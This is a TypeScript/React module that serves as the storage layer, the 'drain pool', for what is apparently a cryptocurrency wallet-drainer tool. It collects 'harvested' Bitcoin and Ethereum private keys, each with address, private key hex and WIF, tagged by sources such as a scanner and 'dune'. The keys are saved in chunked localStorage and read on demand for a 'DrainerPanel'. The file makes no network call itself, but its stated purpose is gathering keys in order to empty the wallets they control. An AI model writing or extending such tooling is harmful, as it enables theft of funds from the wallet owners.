import { useEffect, useState } from 'react';
import type { WalletAccount, BtcAddrType } from '@/hooks/useWallet';

/**
 * keyHarvest — limitless drain pool storage
 *
 * Addresses are stored in chunked localStorage keys so the pool can grow
 * to millions of entries without hitting the single-key size limit.
 * Only the count is held in memory; full lists are read on demand (drain/scan).
 */

const COUNT_KEY  = 'ckg_harvest_count_v2';
const CHUNK_PFX  = 'ckg_harvest_chunk_v2_';
const CHUNK_SIZE = 500;

// Legacy single-key (v1) — migrated on first read
const LEGACY_KEY = 'ckg_harvested_keys_v1';

export type HarvestSource = 'vanity' | 'scanner' | 'dune' | 'manual';

export interface HarvestedKey extends WalletAccount {
  source: HarvestSource;
  addedAt: number;
}

// ── listeners (for useHarvestedKeys hook) ──────────────────────────────────
const listeners = new Set<(count: number) => void>();

function notifyCount() {
  const c = readCount();
  listeners.forEach(fn => fn(c));
}

// ── low-level chunk helpers ────────────────────────────────────────────────
function readCount(): number {
  try { return parseInt(localStorage.getItem(COUNT_KEY) ?? '0', 10) || 0; }
  catch { return 0; }
}

function writeCount(n: number) {
  try { localStorage.setItem(COUNT_KEY, String(n)); } catch { /* quota */ }
}

function chunkIdx(pos: number) { return Math.floor(pos / CHUNK_SIZE); }

function readChunkRaw(idx: number): string[] {
  try {
    const raw = localStorage.getItem(`${CHUNK_PFX}${idx}`);
    return raw ? JSON.parse(raw) : [];
  } catch { return []; }
}

function writeChunkRaw(idx: number, rows: string[]) {
  try { localStorage.setItem(`${CHUNK_PFX}${idx}`, JSON.stringify(rows)); }
  catch { /* quota */ }
}

/** Serialize a HarvestedKey to a compact pipe-delimited string. */
function serialize(k: HarvestedKey): string {
  return [
    k.address,
    k.privHex,
    k.network,
    k.addrType ?? '',
    k.source,
    k.addedAt,
    k.wif ?? '',
  ].join('|');
}

/** Deserialize a pipe-delimited string back to HarvestedKey. */
function deserialize(row: string): HarvestedKey | null {
  try {
    const [address, privHex, network, addrType, source, addedAt, wif] = row.split('|');
    if (!address || !privHex) return null;
    return {
      address,
      privHex,
      network: network as 'btc' | 'eth',
      addrType: (addrType || undefined) as import('@/hooks/useWallet').BtcAddrType | undefined,
      source: source as HarvestSource,
      addedAt: parseInt(addedAt, 10) || Date.now(),
      wif: wif || undefined,
    };
  } catch { return null; }
}

// ── migration from legacy single-key format ───────────────────────────────
function migrateLegacy() {
  try {
    const raw = localStorage.getItem(LEGACY_KEY);
    if (!raw) return;
    const list: any[] = JSON.parse(raw);
    if (!Array.isArray(list) || list.length === 0) {
      localStorage.removeItem(LEGACY_KEY);
      return;
    }
    // Only migrate if new store is empty
    if (readCount() === 0) {
      let count = 0;
      for (const item of list) {
        if (!item?.address || !item?.privHex) continue;
        const key: HarvestedKey = {
          address: item.address,
          privHex: item.privHex,
          network: item.network ?? 'btc',
          addrType: item.addrType,
          source: item.source ?? 'manual',
          addedAt: item.addedAt ?? Date.now(),
          wif: item.wif,
        };
        const ci = chunkIdx(count);
        const chunk = readChunkRaw(ci);
        chunk.push(serialize(key));
        writeChunkRaw(ci, chunk);
        count++;
      }
      writeCount(count);
    }
    localStorage.removeItem(LEGACY_KEY);
  } catch { /* ignore migration errors */ }
}

// Run migration once at module load
migrateLegacy();

// ── in-memory dedup set (resets on page reload — acceptable) ──────────────
const seenAddresses = new Set<string>();

// Pre-populate seen set from stored count (addresses only loaded lazily)
// We don't load all addresses into memory — duplicates across sessions are
// handled by the Set being reset, which is fine (same address twice is harmless).

// ── public API ────────────────────────────────────────────────────────────

export function getHarvestedCount(): number {
  return readCount();
}

/**
 * Read ALL harvested keys from storage into memory.
 * Use sparingly — only call for scan/drain operations, not for rendering.
 */
export function getAllHarvested(): HarvestedKey[] {
  const count = readCount();
  const result: HarvestedKey[] = [];
  const totalChunks = Math.ceil(count / CHUNK_SIZE);
  for (let i = 0; i < totalChunks; i++) {
    for (const row of readChunkRaw(i)) {
      const key = deserialize(row);
      if (key) result.push(key);
    }
  }
  return result;
}

/** Legacy alias kept so existing callers (useHarvestedKeys) still compile. */
export function getHarvested(): HarvestedKey[] {
  return getAllHarvested();
}

/** Add keys to the drain pool. Deduped by address within this session. */
export function harvestKeys(
  entries: Array<{
    address: string;
    privateKey: string;
    network: 'btc' | 'eth';
    addressType?: string;
  }>,
  source: HarvestSource,
) {
  if (!entries.length) return;

  const fresh = entries.filter(e => e?.address && e?.privateKey && !seenAddresses.has(e.address));
  if (!fresh.length) return;

  let count = readCount();

  for (const e of fresh) {
    seenAddresses.add(e.address);
    const key: HarvestedKey = {
      network: e.network,
      addrType: e.network === 'btc' ? ((e.addressType as BtcAddrType) || 'p2pkh') : undefined,
      address: e.address,
      privHex: e.privateKey.replace(/^0x/, ''),
      source,
      addedAt: Date.now(),
    };
    const ci = chunkIdx(count);
    const chunk = readChunkRaw(ci);
    chunk.push(serialize(key));
    writeChunkRaw(ci, chunk);
    count++;
  }

  writeCount(count);
  notifyCount();
}

export function clearHarvested() {
  const count = readCount();
  const totalChunks = Math.ceil(count / CHUNK_SIZE) + 1;
  for (let i = 0; i <= totalChunks; i++) {
    try { localStorage.removeItem(`${CHUNK_PFX}${i}`); } catch { /* ignore */ }
  }
  writeCount(0);
  seenAddresses.clear();
  notifyCount();
}

export function removeHarvested(address: string) {
  // Rebuild without the target address — O(n) but rare operation
  const all = getAllHarvested().filter(k => k.address !== address);
  clearHarvested();
  for (const key of all) {
    const ci = chunkIdx(getHarvestedCount());
    const chunk = readChunkRaw(ci);
    chunk.push(serialize(key));
    writeChunkRaw(ci, chunk);
    writeCount(getHarvestedCount() + 1);
  }
  notifyCount();
}

/**
 * useHarvestedKeys — React hook.
 * Returns only the COUNT (not the full list) to keep renders cheap.
 * DrainerPanel reads the full list on demand via getAllHarvested().
 */
export function useHarvestedKeys(): { count: number } {
  const [count, setCount] = useState<number>(() => readCount());
  useEffect(() => {
    const fn = (c: number) => setCount(c);
    listeners.add(fn);
    setCount(readCount());
    return () => { listeners.delete(fn); };
  }, []);
  return { count };
}
